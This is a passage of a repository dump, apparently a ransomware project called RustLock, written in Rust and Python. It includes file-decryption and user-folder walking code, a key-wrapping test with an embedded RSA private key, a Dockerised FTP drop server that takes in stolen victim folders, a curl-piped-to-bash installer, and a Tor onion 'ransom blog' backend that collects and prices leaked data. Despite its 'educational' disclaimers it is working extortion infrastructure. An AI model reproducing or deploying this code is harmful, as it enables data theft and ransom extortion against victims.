            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        let block_len: u32 = 960;
        let buffer_len: u32 = 960;

        let mut eof = 0;
        let mut count = 0;

        let mut pb_buffer: Vec<u8> = Vec::new();
        pb_buffer.resize(buffer_len as usize, 0u8);

        while eof == 0 {
            if ReadFile(
                src_handle,
                pb_buffer.as_ptr() as *mut _,
                block_len,
                &mut count,
                null_mut(),
            ) == 0
            {
                println!("Error reading 0x{:x}", GetLastError());
                break;
            }

            if count < block_len {
                eof = 1;
            }

            if CryptDecrypt(h_key, 0, eof, 0, pb_buffer.as_mut_ptr(), &mut count) == 0 {
                println!("Fail to decrypt 0x{:x}", GetLastError());
                break;
            }

            if WriteFile(
                dest_handle,
                pb_buffer.as_ptr() as *const _,
                count,
                &mut count,
                null_mut(),
            ) == 0
            {
                println!("Fail to write");
                break;
            }
        }
        CryptDestroyKey(h_key);
        CryptReleaseContext(h_crypt_prov, 0);
        CloseHandle(src_handle);
        CloseHandle(dest_handle);
    }
    true
}


================================================
File: RustLock/src/decypher/mod.rs
================================================
pub mod decypher;
pub mod walker;

================================================
File: RustLock/src/decypher/walker.rs
================================================
extern crate winapi;

use crate::decypher::decypher;

use std::ffi::CString;
use std::fs;
use std::io;
use std::path::Path;
use std::ptr::null_mut;
use std::str;

use winapi::um::fileapi::DeleteFileA;
use winapi::um::winbase::GetUserNameA;

/// Traverses the specified directories and calls `traverse_and_decrypt_path`
/// with the AES key and the ransomware extension to perform the decryption
///
/// # Arguments
/// * `directories`   - List of directory names (for example, "Documents", "Downloads")
/// * `aes_key`       - AES key used for decryption
/// * `encrypted_ext` - Extension used by the ransomware-encrypted files
pub fn walk_decrypt(directories: &[&str], aes_key: &[u8], encrypted_ext: &str) {
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();

    unsafe {
        // Retrieve the size of the user name and store it in 'size'
        GetUserNameA(null_mut(), &mut size);

        // Resize the buffer according to the size, then retrieve the user name
        buffer.resize(size as usize, 0i8);
        GetUserNameA(buffer.as_mut_ptr(), &mut size);

        // Convert the buffer to a byte vector and remove the null terminator
        let mut user_name: Vec<u8> = std::mem::transmute(buffer);
        user_name.resize((size - 1) as usize, 0u8); // Adjust size to remove the null terminator

        // Iterate over each directory in the 'directories' slice
        for dir in directories.iter() {
            // Construct the full path: C:\Users\<username>\<directory>
            let mut full_path = String::from("C:\\Users\\");
            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
            full_path.push_str("\\");
            full_path.push_str(dir);

            let full_path_cs: CString = CString::new(full_path.as_bytes()).unwrap();
            println!("Processing: {}", full_path_cs.to_str().unwrap());

            // Call the function to traverse and decrypt the files, passing in the AES key and the ransomware extension
            let _ = traverse_and_decrypt_path(&full_path, aes_key, encrypted_ext);
        }
    }
}

/// Recursively traverses the files within `directory_path` and decrypts
/// those that have the `encrypted_ext` extension using the provided AES key
///
/// # Arguments
/// * `directory_path` - Path to the directory to be traversed
/// * `aes_key`        - AES key used for decryption
/// * `encrypted_ext`  - Extension used by the ransomware-encrypted files
pub fn traverse_and_decrypt_path(directory_path: &str, aes_key: &[u8], encrypted_ext: &str) -> io::Result<()> {
    let directory = Path::new(directory_path);

    if directory.is_dir() {
        for entry in fs::read_dir(directory)? {
            let entry = entry?;
            let path = entry.path();

            // If this is a subdirectory, go deeper
            if path.is_dir() {
                let subdir_str = path.to_str().unwrap_or("");
                traverse_and_decrypt_path(subdir_str, aes_key, encrypted_ext)?;
            } else {
                // Check if the file has the ransomware extension
                if let Some(extension) = path.extension().and_then(|ext| ext.to_str()) {
                    if extension == encrypted_ext {
                        let original_path = path.to_str().unwrap_or("");
                        let mut decrypted_path = path.clone();
                        decrypted_path.set_extension(""); // Remove the ransomware extension
                        let decrypted_path_str = decrypted_path.to_str().unwrap_or("");

                        println!("Decrypting: {} -> {}", original_path, decrypted_path_str);

                        let c_original = CString::new(original_path)
                            .expect("Failed to create CString for source path");
                        let c_decrypted = CString::new(decrypted_path_str)
                            .expect("Failed to create CString for destination path");

                        // Call the decrypt function with the AES key
                        let result = decypher::decrypt(c_original.clone(), c_decrypted, aes_key.to_vec());
                        if !result {
                            println!("Failed to decrypt: {}", original_path);
                        } else {
                            // Remove the encrypted file after successful decryption
                            let _delete_result = unsafe { DeleteFileA(c_original.as_ptr()) };
                        }
                    }
                }
            }
        }
    }
    Ok(())
}


================================================
File: RustLock/tests/keys_cycle.rs
================================================
use rustlock::{config, cypher, decypher};
// TODO: Fix imports
use base64;
use passwords::PasswordGenerator;
use rand::rngs::OsRng;
use rsa::pkcs8::DecodePrivateKey;
use rsa::pkcs8::DecodePublicKey;
use rsa::traits::PublicKeyParts;
use rsa::RsaPrivateKey;
use rsa::{Oaep, RsaPublicKey};
use sha2::Sha256;
use std::env;
use std::error::Error;
use std::ffi::CString;
use std::fs;
use std::fs::File;
use std::io::Write;

const PRIVATE_KEY: &str = r#"-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCWCD1UOFtrDA1F
pR2KIWwFsdo1i9w2Y1tpmRBy4f+hSrmxAv9YkXyhrSh2kU3Em9MzO7/4jhC+QCRa
P7NLKN7KKYNYS4n6pDs0uaDdfM/4vJ9J3hhQiuluQ7W9rmXWlFmOv9plTLjaabka
WdLlKdu6yV8Lqk1kark4QP49b6k2bwbucXZcfjMYMDtHoHK9HPub7iGIrdedb7BF
fzG8atABMDXsAELNmLoWz3XTyF1ROYjn68F0WJGa5Ex+nlfdzI0KSvF97QL5rHXf
tKzuJ4IZjgO+TgHCIaulIQZDkwgCc7XcSkCJqLkmCnINlT5+S7VdQmQ2RTpdEhxI
2q/hMjPpAgMBAAECggEAHglTQeewgatdgtpuIgfT6QX0wjCYazkUBX2T2fQd6ewc
ZfBML66czX9tsOMhNyHdNA4bvkau2m/b90d2fS8W/1E1Tvl8i7XSdplNN9pzhoA4
waCZrJJK7nzWxz1BfSahEV+eeRZVkcCFwt1FyARLzcbf5OV47gghwb3dSG5w6Ykd
RMKUxgnbqPj8UrRelooi2uywz4z0qi40So2USS1+o7Xt1d02qwRX4lElReL81Sxp
u+LcmMXdiZ3NJIPUNey8vZbeT9dySxg1RRXWXNBm22nOXQhpfktTIqTWr1dl4bGn
3FOOZbKlmcYdiphKFSeCEj39UmI0lt/R2JkZBnK7wwKBgQDM9EFl136W2TsaJof3
AOMMai4gHeizqzMR8RefhPF/UqytWTKq82mywfxrU1BqEWckFRUajO43A/ZgrIJ5
IlwQnGznrvmxO4ugbQUuKNYUnvMJN15KY7tln+uGJQtldXes/gZC+czgWPQUbua9
EWqbfNyDLf+S62L8S4oFGw/bqwKBgQC7ZjJCR/lN5Ch8z1RCvnw6AAOyKCcc62GN
4GRa25HJPSuiLS++sfDs9V+wBE/mDnF99VA36RMcsxjo28v+2lO5EvsaQKD/c8yi
f3QkcwX7uJSQT1VIWrSkg9G945WIU1ZSpDD94QGMA+4KBNjQDDzAcOELN/KiJSl1
HB1ydog6uwKBgBJt4DeNIgfkbqkST+WJAeGK5qzio5sMSOJTIIGqjaCaSYao36J5
ksaNJOptqmxvNiwLbUNe6sitpYjZ2j2UNl0UA8Lte+xQ42RAiVe2OlHOXSI2BVeB
Eke4EpCUYir0XheDHAMHvUFrHj98HWlg2Io0twtgpnuKiPMQw89juJBTAoGAJfqm
QOyZSAHveqwCJay5PH/4P8kHdEL3+Gr7q7ZIK4KsLyf9PyaM71kjVWbqUnOm6KIo
6cvgxbY+XCL/itzwjteb8Ewc1OjBFkXCYgi1s7hK05xgalOHvLfCcDuJeKF7IzCH
hUxupdO+EGW/ExsHzPCTi1SBZf8mEcfq5+HB5jUCgYEAkPrAdjOnnmWkr72u7/Bn
+wfFRVeHCOmQDSN3+/sopZyqQdWvfV8uaPU3UEg2TmC28/Rr8IOD6HrxX/qbm/gh
GEPpxab8pRtDc9WxBNmaojQ2FYCF3J0c3oZ9VCRR+CyDcUWOE0LphMT59LlXM6h/
sb+ODQUmiQFB2eLUuYFe25o=
-----END PRIVATE KEY-----
"#;

pub const PUBLIC_KEY_PEM: &str = r#"-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlgg9VDhbawwNRaUdiiFs
BbHaNYvcNmNbaZkQcuH/oUq5sQL/WJF8oa0odpFNxJvTMzu/+I4QvkAkWj+zSyje
yimDWEuJ+qQ7NLmg3XzP+LyfSd4YUIrpbkO1va5l1pRZjr/aZUy42mm5GlnS5Snb
uslfC6pNZGq5OED+PW+pNm8G7nF2XH4zGDA7R6ByvRz7m+4hiK3XnW+wRX8xvGrQ
ATA17ABCzZi6Fs9108hdUTmI5+vBdFiRmuRMfp5X3cyNCkrxfe0C+ax137Ss7ieC
GY4Dvk4BwiGrpSEGQ5MIAnO13EpAiai5JgpyDZU+fku1XUJkNkU6XRIcSNqv4TIz
6QIDAQAB
-----END PUBLIC KEY-----"#;

fn decypher_key(encrypted_aes_key: Vec<u8>) -> Vec<u8> {
    let private_key =
        RsaPrivateKey::from_pkcs8_pem(&PRIVATE_KEY).expect("Error parsing the private key");
    let padding = Oaep::new::<Sha256>();
    let aes_key = private_key
        .decrypt(padding, &encrypted_aes_key)
        .expect("Error decrypting the AES key");

    return aes_key;
}

#[test]
fn test_keys_cycle() {
    // 1. Generate an AES key (the "blob" concatenated with the generated key)
    let aes_key: Vec<u8> = cypher::lib::generate_key();

    let source_f =
        CString::new("C:\\Users\\user\\Ransomware\\RustLock\\tests\\assets\\plain.txt").unwrap();
    let dest_f =
        CString::new("C:\\Users\\user\\Ransomware\\RustLock\\tests\\assets\\cipher.txt").unwrap();
    cypher::cypher::encrypt(source_f, dest_f, aes_key.clone());

    // 2. Encrypt the AES key using the RSA public key
    let encrypted_key = cypher::lib::encrypt_aes_key(aes_key.clone(), PUBLIC_KEY_PEM);

    // 3. Verify that the size of the encrypted message matches the size of the RSA modulus.
    let public_key = RsaPublicKey::from_public_key_pem(cypher::lib::PUBLIC_KEY_PEM)
        .expect("Error parsing the public key");
    let expected_size = public_key.size();

    assert_eq!(
        encrypted_key.len(),
        expected_size,
        "The size of the encrypted message must match the size of the RSA modulus."
    );

    // Print debugging information
    println!("Generated AES key ({} bytes): {:?}", aes_key.len(), aes_key);
    println!(
        "Encrypted AES key ({} bytes): {:?}",
        encrypted_key.len(),
        encrypted_key
    );

    let encoded_key = base64::encode(encrypted_key);
    println!("------------------------------------");
    println!("Base64: {}", encoded_key);
    println!("------------------------------------");
    let aes_key_encrypted = base64::decode(encoded_key).expect("Error decoding the AES key");

    println!(
        "Encrypted AES key ({} bytes): {:?}",
        aes_key_encrypted.len(),
        aes_key_encrypted
    );

    let aes_clean_key = decypher_key(aes_key_encrypted);

    println!("==========================================");
    println!(
        "Clean AES key ({} bytes): {:?}",
        aes_clean_key.len(),
        aes_clean_key
    );
    println!("==========================================");
    let b64_aes_clean = base64::encode(aes_clean_key.clone());
    let aes_pasep = base64::decode(b64_aes_clean).unwrap();
    println!("Clean AES key ({} bytes): {:?}", aes_pasep.len(), aes_pasep);
    println!("==========================================");

    let source_f =
        CString::new("C:\\Users\\user\\Ransomware\\RustLock\\tests\\assets\\cipher.txt").unwrap();
    let dest_f =
        CString::new("C:\\Users\\user\\Ransomware\\RustLock\\tests\\assets\\decypher.txt").unwrap();
    decypher::decypher::decrypt(source_f, dest_f, aes_clean_key);

    assert_eq!(
        aes_key,   // Newly generated key
        aes_pasep // AES key encrypted with RSA, base64 encoded, decoded, decrypted, re-encoded, and decoded again
    );
}


================================================
File: RustLock/tests/assets/plain.txt
================================================
Test fileeeee HELLLLOOOOOOOOOOOOOOO

================================================
File: server/ClearService/readme.md
================================================

# Hidden Service (C2 #1)

## TODO: Install server | Fast deploy

```
curl -O https://raw.githubusercontent.com/M3str3/Ransomware/main/Server/ClearServoce/install.sh | bash
```


================================================
File: server/ClearService/Dockerfile
================================================
FROM python:3.10

ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
ARG API_KEY
ENV API_KEY=$API_KEY

RUN apt-get update && apt-get install -y \
    build-essential \
    python3-dev \
 && rm -rf /var/lib/apt/lists/*

RUN pip install --no-cache-dir flask flask-cors pyftpdlib

RUN mkdir /app
WORKDIR /app
RUN mkdir ftp_upload ftp_processed

RUN touch database.db

COPY api.py /app/api.py
RUN echo $API_KEY 
RUN echo $API_KEY > /app/API_KEY
EXPOSE 2121
EXPOSE 5000

CMD sh -c "python3 -m pyftpdlib --port 2121 --write --directory ftp_upload & \
           python3 api.py $API_KEY"


================================================
File: server/ClearService/api.py
================================================
import os
import sys
import time
import threading
import shutil
import sqlite3
import zipfile
import logging

from flask import Flask, jsonify, request, send_file, abort
from flask_cors import CORS

# Disable default Flask request logs so it doesn't constantly display incoming request addresses
logging.getLogger("werkzeug").setLevel(logging.ERROR)

# Configuration
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "http://localhost:3000"}})

FTP_DIR = "ftp_upload"
PROCESSED_DIR = "ftp_processed"
DB_PATH = "database.db"

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Retrieve API_KEY from command-line arguments or use default
AUTH_TOKEN = sys.argv[1] if len(sys.argv) > 1 else "m3str3"
logging.info(f"API_KEY: {AUTH_TOKEN}")

# Initialize the database
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS posts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            description TEXT,
            price TEXT,
            published BOOLEAN
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# ✅ Function to check if a folder has the correct structure
def is_valid_structure(folder_path):
    required_files = ["key", "file_tree.txt"]
    required_folders = ["data"]

    # Get folder contents
    folder_contents = os.listdir(folder_path)

    # Check that the required files are present
    if not all(file in folder_contents for file in required_files):
        return False

    # Check that the required folders are present
    if not all(os.path.isdir(os.path.join(folder_path, folder)) for folder in required_folders):
        return False

    return True

# 📂 Process a folder that is fully uploaded
def process_folder(folder_path):
    folder_name = os.path.basename(folder_path)

    # Insert into the database and get the assigned ID
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO posts (name, description, price, published) VALUES (?, ?, ?, ?)",
              (folder_name, "No description", "", True))
    post_id = c.lastrowid
    conn.commit()
    conn.close()

    # Rename the folder with the ID and move it to the processed directory
    new_folder_path = os.path.join(PROCESSED_DIR, str(post_id))
    os.makedirs(PROCESSED_DIR, exist_ok=True)
    shutil.move(folder_path, new_folder_path)

    logging.info(f"✔ Processed folder: {folder_name} -> {post_id}")

# 🔄 Monitor ftp_upload to process complete folders
def monitor_ftp():
    while True:
        os.makedirs(FTP_DIR, exist_ok=True)

        for entry in os.listdir(FTP_DIR):
            folder_path = os.path.join(FTP_DIR, entry)

            # Check if it's a directory
            if os.path.isdir(folder_path):
                if is_valid_structure(folder_path):
                    logging.info(f"🟢 Folder ready to be processed: {folder_path}")
                    process_folder(folder_path)
                else:
                    logging.warning(f"⚠ Incomplete folder: {folder_path}")

        time.sleep(5)  # Check every 5 seconds

# Start monitoring in the background
threading.Thread(target=monitor_ftp, daemon=True).start()

@app.route('/posts/', methods=['GET'])
def posts():
    """Returns all posts in JSON format."""
    token = request.headers.get("Authorization")
    if not token or token != f"Bearer {AUTH_TOKEN}":
        abort(403, description="Access denied. Invalid token.")
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, name, description, price, published FROM posts")
    rows = c.fetchall()
    conn.close()
    
    posts_list = [{
        "id": row[0],
        "name": row[1],
        "description": row[2],
        "price": row[3],
        "published": bool(row[4])
    } for row in rows]
    
    return jsonify(posts_list)

@app.route('/download/<int:post_id>', methods=['GET'])
def download_post(post_id):
    """
    Allows downloading a processed folder as a ZIP file 
    if the correct token is provided.
    """
    token = request.headers.get("Authorization")
    if not token or token != f"Bearer {AUTH_TOKEN}":
        abort(403, description="Access denied. Invalid token.")

    folder_path = os.path.join(PROCESSED_DIR, str(post_id))
    if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
        abort(404, description="Requested folder not found.")

    # Create a temporary ZIP file
    zip_filename = f"{post_id}.zip"
    zip_path = os.path.join(PROCESSED_DIR, zip_filename)
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_path))
    
    return send_file(zip_path, as_attachment=True)

if __name__ == '__main__':
    # In debug mode for local testing
    app.run(host='0.0.0.0', port=5000, debug=False)


================================================
File: server/ClearService/install.sh
================================================
#!/bin/bash
# !! IMPORTANT !!
# This script is for educational purposes only. It is not intended to be used for malicious purposes.
# Author: M3str3 <nam3str3@protonmail.com>
# ==============================================================================
# This is the script for install the C2 #1 of my fictional ransomware 
# 
# Use example:
#   ./install.sh <API_KEY>
#
# NOTE: The same API_KEY it has to be configured in the C2#2.

if [ $# -eq 0 ]; then
    echo "Use: $0 <API_KEY>"
    exit 1
fi

# TODO: Like u have entire control over this server, you have to configure in the most
# secure way possible, like using a firewall, VPN, 0 logs, etc.
# Anyways its only the hop server

# Install Docker
#sudo apt-get update && sudo apt-get install -y docker.io

# Get images
curl -O https://raw.githubusercontent.com/M3str3/Ransomware/main/Server/ClearServoce/Dockerfile
curl -O https://raw.githubusercontent.com/M3str3/Ransomware/main/Server/ClearServoce/api.py

# The service running over docker
docker build -t clearservice --build-arg API_KEY=$1 -t clearservice .
docker run -d -p 2121:2121 -p 5000:5000 clearservice

echo "[$] Done! The FTP is running on 2121 and API on 5000. Add this server to your servers.txt on C2#2"

================================================
File: server/HiddenService/readme.md
================================================
# Hidden Service (C2 #2)

This is the final part of my fictional ransomware, the ransom blog. The fist I did it was to create a custom onion url brute forcing the method, I used my own project [Onion Forge](https://github.com/M3str3/Onion-Forge) to do it. The key is saved as `key.bin` the key generated its for the onion url `m3str3qek4qgd2qlp2r6luqju35dts7vyt5n56n657z5hiwtfgnv62qd.onion`

![image](assets/onion-forge.jpg)

And like its usual I did a 




# !! IMPORTANT !!
This script is for educational purposes only. It is not intended to be used for malicious purposes.


================================================
File: server/HiddenService/install.sh
================================================
#!/bin/bash
# !! IMPORTANT !!
# This script is for educational purposes only. It is not intended to be used for malicious purposes.
# Author: M3str3 <nam3str3@protonmail.com>
# ==============================================================================
# This is the script for installing the C2 #2 of my fictional ransomware 
# 
# Use example:
#   ./install.sh 
#

echo "[*] Updating system and installing required packages..."
sudo apt-get update && sudo apt-get install -y nginx tor python3 nodejs

# Install Nginx
echo "[*] Configuring Nginx..."
sudo cp conf/nginx /etc/nginx/sites-available/default
sudo service nginx restart
echo "[+] Nginx installed and restarted."

# Configure TOR
echo "[*] Configuring TOR..."
sudo rm /etc/tor/torrc
sudo cp conf/torrc /etc/tor/torrc
sudo cp conf/key.bin /var/lib/tor/hidden_service/hs_ed25519_secret_key
sudo service tor restart
echo "[+] TOR configuration applied and restarted."

# Install NodeJS
echo "[*] Installing NodeJS dependencies..."
sudo apt-get install -y nodejs
echo "[*] Bulding frontend..."
cd frontend
npm install
npm run build
echo "[*] Setting up frontend..."
cp -r dist/* /var/www/html/.
echo "[+] Frontend setup completed."

cd ../backend/
echo "[*] Installing Python dependencies..."
python3 -m pip install -r requirements.txt
echo "[+] Backend dependencies installed."

echo "[*] Starting backend API..."
python3 api.py


================================================
File: server/HiddenService/backend/api.py
================================================
import os
import time
import threading
import sqlite3
import logging
import requests
from flask_cors import CORS
from flask import Flask, jsonify, request

# Hide default Flask request logs so it doesn't repeatedly show incoming request addresses
logging.getLogger("werkzeug").setLevel(logging.ERROR)

# Flask configuration
app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Database configuration
DB_PATH = "aggregator.db"

# Load server list from servers.txt
# Each line in the file has the format: URL|API_KEY
SERVERS = []
with open("servers.txt", "r") as f:
    servers_lines = f.read().splitlines()
    for line in servers_lines:
        if line.startswith("//"):
            # Skip comment lines
            continue
        parts = line.split("|")
        if len(parts) >= 2:
            SERVERS.append({"name": parts[0], "url": parts[1], "api_key": parts[2]})

# Logging setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Initialize the database
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS posts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            server_id TEXT,
            remote_id INTEGER,
            name TEXT,
            description TEXT,
            price TEXT,
            published BOOLEAN,
            UNIQUE(server_id, remote_id) ON CONFLICT IGNORE
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Add CORS headers to allow access from any origin
@app.after_request
def after_request(response):
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add("Access-Control-Allow-Headers", "Content-Type,Authorization")
    response.headers.add("Access-Control-Allow-Methods", "GET,PUT,POST,DELETE,OPTIONS")
    return response

# 📥 Download post data from a given server
def download_post_data(server, remote_id, post_name):
    download_url = f"{server['url']}/download/{remote_id}"
    headers = {"Authorization": f"Bearer {server['api_key']}"}
    try:
        response = requests.get(download_url, headers=headers, timeout=10)
        if response.status_code == 200:
            os.makedirs("downloads", exist_ok=True)
            # Create a filename based on server name and remote_id
            safe_server = server["name"]
            filename = f"downloads/{post_name}_{safe_server}_{remote_id}.zip"
            with open(filename, "wb") as f:
                f.write(response.content)
            logging.info(f"Downloaded post {remote_id} from {server['name']} to {filename}")
        else:
            logging.warning(f"Failed to download post {remote_id} from {server['name']}, code: {response.status_code}")
    except Exception as e:
        logging.error(f"Error downloading post {remote_id} from {server['name']}: {e}")

# 📦 Save posts to the local database and download new ones
def save_posts(server, posts):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    for post in posts:
        remote_id = post["id"]
        name = post["name"]
        description = post["description"]
        price = post["price"]
        published = post["published"]

        # Check if the post already exists (by server and remote_id)
        c.execute("SELECT 1 FROM posts WHERE server_id = ? AND remote_id = ?", (server["name"], remote_id))
        exists = c.fetchone()
        if not exists:
            # Insert the new post
            c.execute('''
                INSERT INTO posts (server_id, remote_id, name, description, price, published)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (server["name"], remote_id, name, description, price, published))
            conn.commit()
            logging.info(f"New post found: {server['name']} id {remote_id}")
            # Download the full post data from the server
            download_post_data(server, remote_id, name)
    conn.close()
    logging.info(f"✅ Processed {len(posts)} posts from {server['name']} ({server['url']})")

# 🔄 Periodically fetch posts from servers
def fetch_posts():
    while True:
        for server in SERVERS:
            try:
                headers = {"Authorization": f"Bearer {server['api_key']}"}
                response = requests.get(f"{server['url']}/posts/", headers=headers, timeout=5)
                
                if response.status_code == 200:
                    posts = response.json()
                    save_posts(server, posts)
                else:
                    logging.warning(f"⚠ Unable to fetch posts from {server['name']}. Code: {response.status_code}")

            except requests.RequestException as e:
                logging.error(f"❌ Error connecting to {server['name']}: {e}")

        time.sleep(10)  # Repeat every 10 seconds

# 🚀 API to retrieve locally stored posts
@app.route("/api/posts/", methods=["GET"])
def aggregated_posts():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT server_id, remote_id, name, description, price, published FROM posts")
    rows = c.fetchall()
    conn.close()

    posts_list = [{
        "server_id": row[0],
        "remote_id": row[1],
        "name": row[2],
        "description": row[3],
        "price": row[4],
        "published": bool(row[5])
    } for row in rows]

    return jsonify(posts_list)

# 🚀 API to retrieve posts from a specific server
@app.route("/aggregated_posts/<server_id>", methods=["GET"])
def aggregated_posts_by_server(server_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT remote_id, name, description, price, published FROM posts WHERE server_id = ?", (server_id,))
    rows = c.fetchall()
    conn.close()

    posts_list = [{
        "remote_id": row[0],
        "name": row[1],
        "description": row[2],
        "price": row[3],
        "published": bool(row[4])
    } for row in rows]

    return jsonify(posts_list)

# 🏃 Start monitoring in a separate thread
threading.Thread(target=fetch_posts, daemon=True).start()

if __name__ == "__main__":
    # Run the Flask application
    app.run(host="0.0.0.0", port=5001, debug=False)


================================================
File: server/HiddenService/backend/requirements.txt
================================================
Flask
flask-cors
requests

================================================
File: server/HiddenService/backend/servers.txt
================================================
// List of C2#1 servers as IP:API_PORT|API_KEY
Main|http://127.0.0.1:5000|appi

================================================
File: server/HiddenService/conf/nginx
================================================
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /var/www/html;
    index index.html index.htm index.nginx-debian.html;
    server_name _;

    location / {
        try_files $uri $uri/ =404;
    }

    location /api/ {
        proxy_pass http://127.0.0.1:5001/api/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}


================================================
File: server/HiddenService/conf/torrc
================================================
## Configuration file for a typical Tor user
## Last updated 9 October 2013 for Tor 0.2.5.2-alpha.
## (may or may not work for much older or much newer versions of Tor.)
##
## Lines that begin with "## " try to explain what's going on. Lines
## that begin with just "#" are disabled commands: you can enable them
## by removing the "#" symbol.
##
## See 'man tor', or https://www.torproject.org/docs/tor-manual.html,
## for more options you can use in this file.
##
## Tor will look for this file in various places based on your platform:
## https://www.torproject.org/docs/faq#torrc

## Tor opens a socks proxy on port 9050 by default -- even if you don't
## configure one below. Set "SocksPort 0" if you plan to run Tor only
## as a relay, and not make any local application connections yourself.
#SocksPort 9050 # Default: Bind to localhost:9050 for local connections.
#SocksPort 192.168.0.1:9100 # Bind to this address:port too.

## Entry policies to allow/deny SOCKS requests based on IP address.
## First entry that matches wins. If no SocksPolicy is set, we accept
## all (and only) requests that reach a SocksPort. Untrusted users who
## can access your SocksPort may be able to learn about the connections
## you make.
#SocksPolicy accept 192.168.0.0/16
#SocksPolicy reject *

## Logs go to stdout at level "notice" unless redirected by something
## else, like one of the below lines. You can have as many Log lines as
## you want.
##
## We advise using "notice" in most cases, since anything more verbose
## may provide sensitive information to an attacker who obtains the logs.
##
## Send all messages of level 'notice' or higher to /var/log/tor/notices.log
#Log notice file /var/log/tor/notices.log
## Send every possible message to /var/log/tor/debug.log
#Log debug file /var/log/tor/debug.log
## Use the system log instead of Tor's logfiles
#Log notice syslog
## To send all messages to stderr:
#Log debug stderr

## Uncomment this to start the process in the background... or use
## --runasdaemon 1 on the command line. This is ignored on Windows;
## see the FAQ entry if you want Tor to run as an NT service.
#RunAsDaemon 1

## The directory for keeping all the keys/etc. By default, we store
## things in $HOME/.tor on Unix, and in Application Data\tor on Windows.
#DataDirectory /var/lib/tor

## The port on which Tor will listen for local connections from Tor
## controller applications, as documented in control-spec.txt.
#ControlPort 9051
## If you enable the controlport, be sure to enable one of these
## authentication methods, to prevent attackers from accessing it.
#HashedControlPassword 16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C
#CookieAuthentication 1

############### This section is just for location-hidden services ###

## Once you have configured a hidden service, you can look at the
## contents of the file ".../hidden_service/hostname" for the address
## to tell people.
##
## HiddenServicePort x y:z says to redirect requests on port x to the
## address y:z.

HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:80

#HiddenServiceDir /var/lib/tor/other_hidden_service/
#HiddenServicePort 80 127.0.0.1:80
#HiddenServicePort 22 127.0.0.1:22

################ This section is just for relays #####################
#
## See https://www.torproject.org/docs/tor-doc-relay for details.

## Required: what port to advertise for incoming Tor connections.
#ORPort 9001
## If you want to listen on a port other than the one advertised in
## ORPort (e.g. to advertise 443 but bind to 9090), you can do it as
## follows.  You'll need to do ipchains or other port forwarding
## yourself to make this work.
#ORPort 443 NoListen
#ORPort 127.0.0.1:9090 NoAdvertise

## The IP address or full DNS name for incoming connections to your
## relay. Leave commented out and Tor will guess.
#Address noname.example.com

## If you have multiple network interfaces, you can specify one for
## outgoing traffic to use.
# OutboundBindAddress 10.0.0.5

## A handle for your relay, so people don't have to refer to it by key.
#Nickname ididnteditheconfig

## Define these to limit how much relayed traffic you will allow. Your
## own traffic is still unthrottled. Note that RelayBandwidthRate must
## be at least 20 KB.
## Note that units for these config options are bytes per second, not bits
## per second, and that prefixes are binary prefixes, i.e. 2^10, 2^20, etc.
#RelayBandwidthRate 100 KB  # Throttle traffic to 100KB/s (800Kbps)
#RelayBandwidthBurst 200 KB # But allow bursts up to 200KB/s (1600Kbps)

## Use these to restrict the maximum traffic per day, week, or month.
## Note that this threshold applies separately to sent and received bytes,
## not to their sum: setting "4 GB" may allow up to 8 GB total before
## hibernating.
##
## Set a maximum of 4 gigabytes each way per period.
#AccountingMax 4 GB
## Each period starts daily at midnight (AccountingMax is per day)
#AccountingStart day 00:00
## Each period starts on the 3rd of the month at 15:00 (AccountingMax
## is per month)
#AccountingStart month 3 15:00

## Administrative contact information for this relay or bridge. This line
## can be used to contact you if your relay or bridge is misconfigured or
## something else goes wrong. Note that we archive and publish all
## descriptors containing these lines and that Google indexes them, so
## spammers might also collect them. You may want to obscure the fact that
## it's an email address and/or generate a new address for this purpose.
#ContactInfo Random Person <nobody AT example dot com>
## You might also include your PGP or GPG fingerprint if you have one:
#ContactInfo 0xFFFFFFFF Random Person <nobody AT example dot com>

## Uncomment this to mirror directory information for others. Please do
## if you have enough bandwidth.
#DirPort 9030 # what port to advertise for directory connections
## If you want to listen on a port other than the one advertised in
## DirPort (e.g. to advertise 80 but bind to 9091), you can do it as
## follows.  below too. You'll need to do ipchains or other port
## forwarding yourself to make this work.
#DirPort 80 NoListen
#DirPort 127.0.0.1:9091 NoAdvertise
## Uncomment to return an arbitrary blob of html on your DirPort. Now you
